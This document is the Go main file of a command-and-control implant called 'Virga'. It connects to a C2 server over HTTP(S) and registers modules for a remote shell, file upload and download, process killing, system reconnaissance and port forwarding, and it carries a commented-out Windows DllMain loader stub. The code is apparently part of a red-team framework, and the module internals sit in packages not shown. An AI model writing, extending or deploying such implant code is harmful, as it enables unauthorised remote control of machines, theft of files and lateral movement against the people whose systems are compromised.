package main

import (
	"fmt"
	"os"
	"runtime"

	"github.com/r74tech/virga/internal/implant/config"
	"github.com/r74tech/virga/internal/implant/core"
	"github.com/r74tech/virga/internal/implant/logger"
	"github.com/r74tech/virga/internal/implant/modules/download"
	"github.com/r74tech/virga/internal/implant/modules/kill"
	logmodule "github.com/r74tech/virga/internal/implant/modules/log"
	"github.com/r74tech/virga/internal/implant/modules/memdb"
	"github.com/r74tech/virga/internal/implant/modules/netstat"
	"github.com/r74tech/virga/internal/implant/modules/portfwd"
	"github.com/r74tech/virga/internal/implant/modules/ps"
	"github.com/r74tech/virga/internal/implant/modules/shell"
	"github.com/r74tech/virga/internal/implant/modules/sysinfo"
	"github.com/r74tech/virga/internal/implant/modules/upload"
	"github.com/r74tech/virga/internal/implant/transport"
)

func main() {
	// Initial debug output (both stdout and stderr)
	startupMsg := fmt.Sprintf("[STARTUP] Virga implant starting... (PID: %d)\n", os.Getpid())
	fmt.Print(startupMsg)
	fmt.Fprint(os.Stderr, startupMsg)

	logEnabledMsg := fmt.Sprintf("[STARTUP] Log enabled: %s\n", config.BuildImplantLogEnabled)
	fmt.Print(logEnabledMsg)
	fmt.Fprint(os.Stderr, logEnabledMsg)

	logPathMsg := fmt.Sprintf("[STARTUP] Log path: %s\n", config.GetImplantLogFilePath())
	fmt.Print(logPathMsg)
	fmt.Fprint(os.Stderr, logPathMsg)

	// Initialize the logger
	log := logger.Get()
	defer func() {
		// Print the final message before closing the logger
		log.Info("Virga implant shutting down")
		log.Close()
	}()

	// Check if the logger is enabled
	if log.IsEnabled() {
		successMsg := fmt.Sprintf("[STARTUP] Logger initialized successfully, writing to: %s\n", log.GetLogFilePath())
		fmt.Print(successMsg)
		fmt.Fprint(os.Stderr, successMsg)
	} else {
		failMsg := "[STARTUP] Logger is disabled or failed to initialize\n"
		fmt.Print(failMsg)
		fmt.Fprint(os.Stderr, failMsg)
	}

	// Create the configuration (using values injected at build time)
	cfg := config.NewConfig()

	// Log start message
	log.Info("Virga implant starting", map[string]interface{}{
		"version":     "1.0.0",
		"os":          runtime.GOOS,
		"arch":        runtime.GOARCH,
		"pid":         os.Getpid(),
		"log_enabled": log.IsEnabled(),
		"log_path":    log.GetLogFilePath(),
	})

	// Create the transport
	var t transport.Transport
	switch cfg.C2Protocol {
	case "https", "http":
		t = transport.NewHTTPTransport(cfg)
	// TODO: Add DNS, mTLS, etc.
	default:
		t = transport.NewHTTPTransport(cfg)
	}

	// Create the implant
	implant := core.NewImplant(cfg, t)

	// Register the modules
	implant.RegisterModule(&shell.ShellModule{})
	implant.RegisterModule(&shell.PwdModule{})
	implant.RegisterModule(&shell.CdModule{})
	implant.RegisterModule(&shell.LsModule{})
	implant.RegisterModule(&logmodule.LogModule{})

	// File operation modules
	implant.RegisterModule(&upload.UploadModule{})
	implant.RegisterModule(&download.DownloadModule{})

	// System information modules
	implant.RegisterModule(&ps.PsModule{})
	implant.RegisterModule(&kill.KillModule{})
	implant.RegisterModule(&sysinfo.SysinfoModule{})

	// Network modules
	implant.RegisterModule(&netstat.NetstatModule{})
	implant.RegisterModule(portfwd.NewPortfwdModule())

	// MemDB module if available
	if implant.DB != nil {
		implant.RegisterModule(memdb.NewMemDBModule(implant.DB))
	}

	implant.Run()
}

// DLL entry point (Windows only, controlled by build tags)
// //export DllMain
// func DllMain(hinstDLL uintptr, fdwReason uint32, lpvReserved uintptr) bool {
// 	switch fdwReason {
// 	case 1: // DLL_PROCESS_ATTACH
// 		go main()
// 	}
// 	return true
// }
